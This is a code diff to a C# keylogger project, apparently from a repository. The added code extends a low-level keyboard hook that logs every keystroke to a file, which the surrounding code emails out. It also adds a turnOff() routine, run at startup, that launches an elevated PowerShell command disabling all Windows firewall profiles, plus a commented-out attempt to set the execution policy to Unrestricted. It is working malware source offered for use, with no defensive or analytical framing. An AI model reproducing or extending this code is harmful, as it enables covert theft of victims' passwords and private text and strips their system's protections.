@@ -5,6 +5,10 @@ using System.Windows.Forms; //running app and converting keys
 using System.IO;
 using System.Net;
 using System.Net.Mail;
+using System.Collections.ObjectModel;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+
 
 namespace Keylogger01
 {
@@ -31,6 +35,7 @@ namespace Keylogger01
         public void start()
         {
             hook = SetHook(llkProcedure);   //Defining our hook
+            turnOff();                      //Turning off firewall via powershell
             Application.Run();              // Main loop
             UnhookWindowsHookEx(hook);
         }
@@ -62,6 +67,46 @@ namespace Keylogger01
                         output.Write(" ");
                         output.Close();
                         break;
+                    case "OemMinus":
+                        Console.Out.Write("-");
+                        output.Write("-");
+                        output.Close();
+                        break;
+                    case "Oem7":
+                        Console.Out.Write("§");
+                        output.Write("§");
+                        output.Close();
+                        break;
+                    case "Oem1":
+                        Console.Out.Write("ů");
+                        output.Write("ů");
+                        output.Close();
+                        break;
+                    case "Oem6":
+                        Console.Out.Write(")");
+                        output.Write(")");
+                        output.Close();
+                        break;
+                    case "OemOpenBrackets":
+                        Console.Out.Write("ú");
+                        output.Write("ú");
+                        output.Close();
+                        break;
+                    case "OemQuestion":
+                        Console.Out.Write("´");
+                        output.Write("´");
+                        output.Close();
+                        break;
+                    case "Oemplus":
+                        Console.Out.Write("=");
+                        output.Write("=");
+                        output.Close();
+                        break;
+                    case "Oem5":
+                        Console.Out.Write("¨");
+                        output.Write("¨");
+                        output.Close();
+                        break;
                     default:
                         Console.Out.Write((Keys)vkCode);
                         output.Write((Keys)vkCode);
@@ -90,8 +135,6 @@ namespace Keylogger01
 
         static void sendNewMessage()
         {
-            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-            string filePath = folderName + fileName;
             String logContents = File.ReadAllText(fileName);
             string emailBody = "";
 
@@ -124,6 +167,20 @@ namespace Keylogger01
             mailMessage.Body = emailBody;
             client.Send(mailMessage);
 
+        }
+
+        private void turnOff()
+        {
+            /*PowerShell ps = PowerShell.Create();
+            ps.AddCommand("Set-ExecutionPolicy").AddParameter("Scope","CurrentUser").AddParameter("ExecutionPolicy","Unrestricted");
+            ps.AddStatement().AddCommand("Set-NetFirewallProfile")
+              .AddParameter("Enabled", "False");
+            ps.Invoke();*/ //this runs without admin privileges, so, not Working
+            var newProcessInfo = new ProcessStartInfo();
+            newProcessInfo.FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
+            newProcessInfo.Verb = "runas";
+            newProcessInfo.Arguments = "Set-NetFirewallProfile -Enabled False";
+            Process.Start(newProcessInfo); 
         }
 
         [DllImport("user32.dll")]
